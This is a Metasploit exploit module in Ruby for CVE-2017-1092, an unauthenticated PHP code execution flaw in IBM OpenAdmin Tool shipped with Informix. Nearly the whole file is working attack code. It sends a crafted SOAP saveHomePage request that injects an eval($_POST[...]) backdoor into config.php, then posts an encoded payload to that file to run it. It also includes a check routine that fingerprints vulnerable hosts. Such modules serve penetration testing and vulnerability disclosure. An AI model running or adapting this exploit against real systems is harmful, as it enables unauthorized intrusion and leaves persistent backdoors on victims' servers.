# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include REXML

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated remote PHP code execution
        vulnerability in IBM OpenAdmin Tool included with IBM Informix
        versions 11.5, 11.7, and 12.1.

        The &#039;welcomeServer&#039; SOAP service does not properly validate user input
        in the &#039;new_home_page&#039; parameter of the &#039;saveHomePage&#039; method allowing
        arbitrary PHP code to be written to the config.php file. The config.php
        file is executed in most pages within the application, and accessible
        directly via the web root, resulting in code execution.

        This module has been tested successfully on IBM OpenAdmin Tool 3.14
        on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;SecuriTeam&#039;, # Discovery and exploit
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-1092&#039;],
          [&#039;EDB&#039;, &#039;42091&#039;],
          [&#039;URL&#039;, &#039;https://www-01.ibm.com/support/docview.wss?uid=swg22002897&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/3210&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2017/May/105&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Privileged&#039;     => false, # Privileged on Windows but not on *nix targets
      &#039;Targets&#039;        => [[&#039;Generic (PHP Payload)&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;May 30 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to IBM OpenAdmin Tool&#039;, &#039;/openadmin&#039; ])
      ]
    )
  end

  def set_home_page(homepage)
    xml = Document.new
    xml.add_element &#039;soapenv:Envelope&#039;, &#039;xmlns:xsi&#039;     => &#039;http://www.w3.org/2001/XMLSchema-instance&#039;,
                                        &#039;xmlns:xsd&#039;     => &#039;http://www.w3.org/2001/XMLSchema&#039;,
                                        &#039;xmlns:soapenv&#039; => &#039;http://schemas.xmlsoap.org/soap/envelope/&#039;,
                                        &#039;xmlns:urn&#039;     => &#039;urn:Welcome&#039;
    xml.root.add_element &#039;soapenv:Header&#039;
    xml.root.add_element &#039;soapenv:Body&#039;
    body = xml.root.elements[2]
    body.add_element &#039;urn:saveHomePage&#039;, &#039;soapenv:encodingStyle&#039; => &#039;http://schemas.xmlsoap.org/soap/encoding/&#039;
    new_home_page = body.elements[1].add_element &#039;new_home_page&#039;, &#039;xsi:type&#039; => &#039;xsd:string&#039;
    new_home_page.text = homepage

    uri = normalize_uri target_uri.path, &#039;services&#039;, &#039;welcome&#039;, &#039;welcomeService.php&#039;
    send_request_cgi &#039;method&#039;  => &#039;POST&#039;,
                     &#039;uri&#039;     => uri,
                     &#039;ctype&#039;   => &#039;text/xml; charset=UTF-8&#039;,
                     &#039;headers&#039; => { &#039;SOAPAction&#039; => &#039;urn:QBEAction&#039; },
                     &#039;data&#039;    => xml.to_s
  end

  def check
    fingerprint = Rex::Text.rand_text_alpha(rand(10) + 6)
    res = set_home_page "\";##{fingerprint}"

    unless res
      vprint_status "#{peer} Connection failed"
      return CheckCode::Unknown
    end

    if res.code == 200 && res.body =~ %r{<ns1:saveHomePageResponse><return xsi:type="xsd:string">";##{fingerprint}</return>}
      return CheckCode::Detected
    end

    Msf::Exploit::CheckCode::Safe
  end

  def exploit
    cmd_param = Rex::Text.rand_text_alpha(rand(10) + 6)

    res = set_home_page "\";eval($_POST[&#039;#{cmd_param}&#039;]); #"

    unless res
      vprint_status "#{peer} Connection failed"
      return CheckCode::Unknown
    end

    if res.code == 200 && res.body =~ /<ns1:saveHomePageResponse><return xsi:type="xsd:string">";eval/
      print_good "#{peer} Wrote backdoor to config.php file successfully"
    else
      fail_with Failure::UnexpectedReply, "#{peer} Failed to backdoor config.php"
    end

    vprint_status "#{peer} Executing payload..."
    send_request_cgi({ &#039;method&#039;    => &#039;POST&#039;,
                       &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;conf&#039;, &#039;config.php&#039;),
                       &#039;vars_post&#039; => { cmd_param => payload.encoded } }, 5)

    print_warning "#{peer} Replace the &#039;config.php&#039; file with &#039;BAKconfig.php&#039; to remove the backdoor"
  end
end

